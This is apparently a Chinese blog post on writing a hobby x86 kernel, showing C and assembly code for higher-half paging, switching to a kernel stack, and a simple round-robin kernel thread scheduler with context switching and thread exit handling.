<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vmm_init</span><span class="params">()</span> &#123;</span><br><span class="line">    kernel_page_directory = (<span class="type">page_table_t</span>*)pmm_alloc_page();</span><br><span class="line">    <span class="keyword">if</span> (kernel_page_directory == <span class="number">0</span>) &#123;</span><br><span class="line">        kernel_printf(<span class="string">&quot;vmm_init: failed to allocate page directory\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(kernel_page_directory, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个页表：映射 0x00000000 - 0x00400000, 前4MB恒等映射，虚拟地址就为物理地址</span></span><br><span class="line">    <span class="type">page_table_t</span>* identity_pt = (<span class="type">page_table_t</span>*)pmm_alloc_page();</span><br><span class="line">    <span class="built_in">memset</span>(identity_pt, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; PAGE_ENTRIES; i++) &#123;</span><br><span class="line">        identity_pt-&gt;entries[i] = (i * PAGE_SIZE) | PAGE_FLAGS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 页目录第 0 项 → 恒等映射</span></span><br><span class="line">    kernel_page_directory-&gt;entries[<span class="number">0</span>] = ((<span class="type">uint32_t</span>)identity_pt) | PAGE_FLAGS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 页目录第 768 项 → 高地址映射：0xC0000000 起点（768*4MB）</span></span><br><span class="line">    kernel_page_directory-&gt;entries[<span class="number">768</span>] = ((<span class="type">uint32_t</span>)identity_pt) | PAGE_FLAGS;</span><br><span class="line"></span><br><span class="line">    enable_paging(kernel_page_directory);</span><br><span class="line">    <span class="comment">// 跳转到分页后高地址映射处执行</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;jmp *%0&quot;</span> :: <span class="string">&quot;r&quot;</span>(kernel_main+<span class="number">0xC0000000</span>))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后把ld的入口函数改一下即可，这里需要注意的是，我们这样设置后，当我们跳转到虚拟地址执行时，会丢失掉调试符号。我们可以手动在gdb里add-symbol-file重新加载一下kernel.elf到地址<strong>0xc0100000</strong>处。</p>
<h4 id="栈设置">栈设置</h4>
<p>我们一开始是在bootloader阶段设置好了esp的值为某一个物理地址，那么当我们启用分页后，理应尽可能少的利用前4MB的恒等映射，而是将其切换到别的虚拟地址处。</p>
<p>我们需要把栈设置到某个虚拟地址处，由于是函数调用，切换栈后会丢失原来的返回地址信息，所以需要事先把返回地址存到某个寄存器中然后最后跳转回去。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_STACK_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_BASE 0xC0100000</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    switch_to_kernel_stack();       <span class="comment">// 切换到内核栈</span></span><br><span class="line">    clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line">    idt_install();</span><br><span class="line">    irq_remap();</span><br><span class="line">    isr_install();</span><br><span class="line">    irq_install();</span><br><span class="line">    kheap_init();                   <span class="comment">// 初始化堆管理</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;    <span class="comment">// 开中断</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; </span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;  <span class="comment">// 节省CPU</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">switch_to_kernel_stack</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uintptr_t</span> stack_top = (<span class="type">uintptr_t</span>)kernel_stack + KERNEL_STACK_SIZE + KERNEL_BASE;</span><br><span class="line">    <span class="type">uintptr_t</span> return_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取返回地址</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov 4(%%ebp), %0\n&quot;</span>   <span class="comment">// 从当前 ebp 栈帧中获取返回地址</span></span></span><br><span class="line"><span class="params">        : <span class="string">&quot;=r&quot;</span>(return_addr)</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="comment">// 切换到新栈并跳转</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov %0, %%esp\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov %0, %%ebp\n&quot;</span>      </span></span><br><span class="line"><span class="params">        <span class="string">&quot;jmp *%1\n&quot;</span>            <span class="comment">// 跳转到保存的返回地址</span></span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;r&quot;</span>(stack_top), <span class="string">&quot;r&quot;</span>(return_addr)</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="内核线程实现">内核线程实现</h4>
<h5 id="多线程执行实现">多线程执行实现</h5>
<p>这里我们先实现一个最简单的内核线程控制，调度策略是顺序调度，每个线程分得相同的时间片。</p>
<p>首先可以设计一下管理线程的结构体，这里一开始主要只用到4个字段，<strong>stack</strong>主要用来存内核线程的栈指针，后续我们会为每个新建的线程用内核堆管理器分配1页内存作为<strong>stack</strong>；<strong>state</strong>是我们的线程状态，参考一些现有的操作系统这里分成了4种，方便后续调度器使用；<strong>time_slice</strong>是每个线程的时间片，后续就是在线程耗尽其拥有的时间片后进行顺序调度；<strong>next</strong>是一个链表的指针域，方便后续使用循环链表进行逐个线程依次调度。其中由于每个线程在触发调度切换时，需要保存当前线程的<strong>context</strong>（也就是所有寄存器状态），而被调度的新的线程需要从中加载自己之前的<strong>context</strong>，所以我们还需要知道<strong>context</strong>结构体的地址。这里我们可以直接把<strong>context</strong>存到栈底，节省空间。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// thread/thread.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> THREAD_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREAD_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdint.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_THREADS 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_STACK_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    THREAD_READY,</span><br><span class="line">    THREAD_RUNNING,</span><br><span class="line">    THREAD_BLOCKED,</span><br><span class="line">    THREAD_EXITED,</span><br><span class="line">&#125; <span class="type">thread_state_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">thread_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> edi, esi, ebp, esp, ebx, edx, ecx, eax; <span class="comment">// pusha 顺序</span></span><br><span class="line">    <span class="type">uint32_t</span> eip;</span><br><span class="line">    <span class="type">uint32_t</span> eflags;</span><br><span class="line">&#125; <span class="type">thread_context_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span>* <span class="built_in">stack</span>;             <span class="comment">// 栈顶指针（用于切换）</span></span><br><span class="line">    <span class="type">thread_state_t</span> state;              <span class="comment">// READY, RUNNING, BLOCKED, etc.</span></span><br><span class="line">    <span class="type">int</span> time_slice;       <span class="comment">// 剩余时间片</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span>* <span class="title">next</span>;</span>  <span class="comment">// 用于连接成调度队列</span></span><br><span class="line">&#125; <span class="type">thread_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回线程上下文的位置</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">thread_context_t</span>* <span class="title function_">thread_get_context</span><span class="params">(<span class="type">thread_t</span>* t)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">thread_context_t</span>*)(t-&gt;<span class="built_in">stack</span> + KERNEL_STACK_SIZE - <span class="keyword">sizeof</span>(<span class="type">thread_context_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化线程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">thread_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个线程</span></span><br><span class="line"><span class="comment">// entry: 线程入口函数;</span></span><br><span class="line"><span class="comment">// 返回值：线程ID</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">thread_create</span><span class="params">(<span class="type">void</span> (*entry)(<span class="type">void</span>))</span>; </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<p>创建线程的函数需要传入一个函数指针作为线程入口，这里我们维护了一个线程数组来管理线程，新线程的创立会从这个数组中找state为<strong>THREAD_EXITED</strong>的线程进行占用，并初始化<strong>context</strong>的eip，esp等字段。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// thread/thread.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;scheduler.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">thread_t</span> threads[MAX_THREADS];</span><br><span class="line"><span class="type">void</span> <span class="title function_">thread_init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_THREADS; i++)&#123;</span><br><span class="line">        threads[i].state = THREAD_EXITED;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    scheduler_init();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">thread_create</span><span class="params">(<span class="type">void</span> (*entry)(<span class="type">void</span>))</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_THREADS; i++)&#123;</span><br><span class="line">        <span class="type">thread_t</span> *t = &amp;threads[i];</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;state == THREAD_EXITED) &#123;</span><br><span class="line">            t-&gt;<span class="built_in">stack</span> = (<span class="type">uint8_t</span> *)kmalloc(KERNEL_STACK_SIZE);</span><br><span class="line">            scheduler_add(t);</span><br><span class="line">            <span class="type">uint32_t</span> *stack_top = t-&gt;<span class="built_in">stack</span> + KERNEL_STACK_SIZE;</span><br><span class="line">            <span class="type">thread_context_t</span> *ctx = thread_get_context(t);</span><br><span class="line">            ctx-&gt;eip = (<span class="type">uint32_t</span>) entry;</span><br><span class="line">            ctx-&gt;eflags = <span class="number">0x202</span>;</span><br><span class="line">            ctx-&gt;esp = (<span class="type">uint32_t</span>) stack_top - <span class="keyword">sizeof</span>(<span class="type">thread_context_t</span>);</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后是调度器的实现，<strong>scheduler_add</strong>主要是往就绪循环链表中添加一个新的线程，<strong>schedule</strong>核心调度逻辑就是将正在执行的线程状态设置为就绪（<strong>READY</strong>），保存其此时的<strong>context</strong>，然后读取新的被调度的线程的<strong>context</strong>，将状态设置为<strong>RUNNING</strong>并切换过去执行。</p>
<p><strong>save_context</strong>的实现主要依赖于之前实现的isr的通用入口保存的寄存器状态，我们的线程被时钟中断打断时，就会直接跳转到对应注册好的irq入口执行，硬件会自动将一些关键寄存器保存push入栈（比如关键的eip），然后我们还会手动push中断号以及错误码入栈。这里除了esp保存的并不直接是前一个线程执行的esp以外，其它寄存器状态都完全是前一个线程的<strong>context</strong>。而esp相对于真实值的偏移也是固定的，因为前面多push的值的数量是确定的，我们恢复esp时需要手动加上偏移来适配。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SCHEDULER_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SCHEDULER_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_SLICE 5</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">thread_t</span>* current_thread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">thread_t</span>* ready_queue = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">scheduler_init</span><span class="params">()</span>;      <span class="comment">// 初始化线程调度器</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">scheduler_add</span><span class="params">(<span class="type">thread_t</span>* thread)</span>;   <span class="comment">// 添加线程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">()</span>;            <span class="comment">// 调度线程</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// thread/scheduler.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;scheduler.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">scheduler_init</span><span class="params">()</span> &#123;</span><br><span class="line">    ready_queue = <span class="literal">NULL</span>;</span><br><span class="line">    current_thread = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">scheduler_add</span><span class="params">(<span class="type">thread_t</span>* thread)</span> &#123;</span><br><span class="line">    thread-&gt;state = THREAD_READY;</span><br><span class="line">    thread-&gt;time_slice = DEFAULT_SLICE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ready_queue) &#123;</span><br><span class="line">        ready_queue = thread;</span><br><span class="line">        thread-&gt;next = thread;  <span class="comment">// 环形链表</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">thread_t</span>* temp = ready_queue;</span><br><span class="line">        <span class="keyword">while</span> (temp-&gt;next != ready_queue)   <span class="comment">// 找到尾节点</span></span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line"></span><br><span class="line">        temp-&gt;next = thread;</span><br><span class="line">        thread-&gt;next = ready_queue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// extern void save_context(thread_context_t* ctx,registers_t r);</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">load_context</span><span class="params">(<span class="type">thread_context_t</span>* ctx)</span>;</span><br><span class="line"><span class="comment">// Round-Robin Scheduling</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">(<span class="type">registers_t</span>* r)</span> &#123;     <span class="comment">// r: irq中断发生时保存的寄存器</span></span><br><span class="line">    <span class="type">thread_t</span>* prev = current_thread;  <span class="comment">// 暂存旧线程指针</span></span><br><span class="line">    <span class="keyword">if</span> (!current_thread) &#123;</span><br><span class="line">        current_thread = ready_queue;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        current_thread-&gt;state = THREAD_READY;</span><br><span class="line">        current_thread = current_thread-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    current_thread-&gt;state = THREAD_RUNNING;</span><br><span class="line">    current_thread-&gt;time_slice = DEFAULT_SLICE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev) </span><br><span class="line">        save_context(thread_get_context(prev),r);</span><br><span class="line">    load_context(thread_get_context(current_thread));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_context</span><span class="params">(<span class="type">thread_context_t</span>* ctx, <span class="type">registers_t</span>* r)</span> &#123;</span><br><span class="line">    ctx-&gt;edi = r-&gt;edi;</span><br><span class="line">    ctx-&gt;esi = r-&gt;esi;</span><br><span class="line">    ctx-&gt;ebp = r-&gt;ebp;</span><br><span class="line">    ctx-&gt;esp = (r-&gt;esp+<span class="number">0x14</span>);</span><br><span class="line">    ctx-&gt;ebx = r-&gt;ebx;</span><br><span class="line">    ctx-&gt;edx = r-&gt;edx;</span><br><span class="line">    ctx-&gt;ecx = r-&gt;ecx;</span><br><span class="line">    ctx-&gt;eax = r-&gt;eax;</span><br><span class="line">    ctx-&gt;eip = r-&gt;eip;</span><br><span class="line">    ctx-&gt;eflags = r-&gt;eflags;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/image-20250607204127152.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/image-20250607204224495.png"
                      class=""
                >
<p>其中<strong>load_context</strong>由汇编实现，这里我们需要利用一个通用寄存器（这里选用的是eax），先设置好其它寄存器的值，尤其是把目标跳转的eip需要push入栈，最后再还原eax的值。这里比较巧妙的是esp的还原，因为我们后续需要利用栈来存eflags和eip，所以不可避免的会修改esp的值并往较低地址处写入内容，那这是否会有一种情况我们<strong>push</strong>的值会<strong>破坏掉线程后面需要利用</strong>到的值呢？事实上正常函数执行时，其局部变量地址都是高于esp的，所以我们的<strong>push</strong>并不会影响线程的执行。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; thread_switch.asm</span><br><span class="line"></span><br><span class="line">global load_context</span><br><span class="line"></span><br><span class="line">; 参数: [esp + 4] = ctx</span><br><span class="line">load_context:</span><br><span class="line">    mov eax, [esp + 4]</span><br><span class="line"></span><br><span class="line">    mov edi, [eax + 0]</span><br><span class="line">    mov esi, [eax + 4]</span><br><span class="line">    mov ebp, [eax + 8]</span><br><span class="line">    mov esp, [eax + 12]</span><br><span class="line">    mov ebx, [eax + 16]</span><br><span class="line">    mov edx, [eax + 20]</span><br><span class="line">    mov ecx, [eax + 24]</span><br><span class="line">    push dword [eax + 36]    ; eflags</span><br><span class="line">    popfd</span><br><span class="line"></span><br><span class="line">    mov eax, [eax + 32]</span><br><span class="line">    push eax</span><br><span class="line">    mov eax, [eax + 28] </span><br><span class="line">    ret               ; 返回到 ctx-&gt;eip</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>最后加入两个线程执行看看结果，发现可以正常交错打印字符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    switch_to_kernel_stack();       <span class="comment">// 切换到内核栈</span></span><br><span class="line">    clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line">    idt_install();</span><br><span class="line">    irq_remap();</span><br><span class="line">    isr_install();</span><br><span class="line">    irq_install();</span><br><span class="line">    kheap_init();                   <span class="comment">// 初始化堆管理</span></span><br><span class="line">    thread_init();          <span class="comment">// 初始化线程管理</span></span><br><span class="line"></span><br><span class="line">    thread_create(thread_a);</span><br><span class="line">    thread_create(thread_b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;    <span class="comment">// 开中断</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; </span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;  <span class="comment">// 节省CPU</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">thread_a</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        kernel_printf(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">thread_b</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        kernel_printf(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/image-20250607171949570.png"
                      class=""
                >
<h5 id="增加线程返回处理">增加线程返回处理</h5>
<p>上述线程是在死循环中执行的，所以没什么问题，但是肯定不是所有的线程都是会一直持续下去。我们之前进入线程一直都是在load_context里面直接根据context进行跳转。但如果执行到了一个线程的ret，那么会直接返回到一个非法的地址崩溃。所以我们需要为线程的结束设置一个处理函数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/image-20250607205415960.png"
                      class=""
                >
<p>由于线程退出我们需要<strong>回收线程栈所占的内存</strong>以及将退出的线程<strong>从调度就绪列表中移除</strong>，一开始我们是维护了一个next指针域来实现一个循环链表，但这样在链表中移除某个线程时会比较麻烦，所以我就加了一个prev域来维护一个双向循环链表。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/image-20250607210002335.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/image-20250607210031156.png"
                      class=""
                >
<p>然后遇到的问题是，我们如何让我们的<strong>thread</strong>在退出时不会直接崩溃，而是回来调用<strong>thread_exit</strong>进行统一处理。这里其实我们可以往外套一层<strong>thread_start</strong>来进行包装整个线程执行，其接受线程入口函数指针作为参数，然后<strong>thread_start</strong>在执行完线程函数后会调用<strong>thread_exit</strong>，这样就能让线程正常退出了。我们所需要微调的就是一开始创建线程时的context赋值，这里我们需要把eip设置为<strong>thread_start</strong>入口，然后手动将参数写入栈中。之前定位esp是通过栈底地址减去<strong>context</strong>结构体大小得到的，这里由于需要腾出存func参数的空间，所以干脆直接指定栈底到实际可用栈底的偏移<strong>STACK_OFFSET</strong>，预留一部分空间在中间。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_OFFSET 0x40</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">thread_create</span><span class="params">(<span class="type">void</span> (*entry)(<span class="type">void</span>))</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_THREADS; i++)&#123;</span><br><span class="line">        <span class="type">thread_t</span> *t = &amp;threads[i];</span><br><span class="line">        <span class="keyword">if</span> (t-&gt;state == THREAD_EXITED) &#123;</span><br><span class="line">            t-&gt;<span class="built_in">stack</span> = (<span class="type">uint8_t</span> *)kmalloc(KERNEL_STACK_SIZE);</span><br><span class="line">            scheduler_add(t);</span><br><span class="line">            <span class="type">uint32_t</span> *stack_top = t-&gt;<span class="built_in">stack</span> + KERNEL_STACK_SIZE;</span><br><span class="line">            <span class="type">thread_context_t</span> *ctx = thread_get_context(t);</span><br><span class="line">            ctx-&gt;eip = (<span class="type">uint32_t</span>) thread_start;         </span><br><span class="line">            ctx-&gt;eflags = <span class="number">0x202</span>;</span><br><span class="line">            ctx-&gt;esp = (<span class="type">uint32_t</span>) stack_top - STACK_OFFSET;</span><br><span class="line">            ((<span class="type">uint32_t</span>*)(ctx-&gt;esp))[<span class="number">1</span>] = (<span class="type">uint32_t</span>)entry;  <span class="comment">// 参数: func</span></span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">thread_start</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span>))</span> &#123;</span><br><span class="line">    func();            <span class="comment">// 执行线程函数</span></span><br><span class="line">    thread_exit();     <span class="comment">// 自动调用退出处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后就是实现具体的退出函数，主要就是把线程的状态修改为退出，并把对应线程从调度链表中删除，最后回收线程栈。这里需要注意一开始要把中断关掉，避免在退出或调度时又有新的中断打断执行导致无法预期的情况发生，最后可以在<strong>load_context</strong>中ret到对应线程执行地址前再打开中断。</p>
<p>后面的<strong>schedule</strong>函数逻辑也需要进行微调，因为退出的线程调用<strong>schedule</strong>时实际上不需要保存对应寄存器状态，直接切换即可。</p>
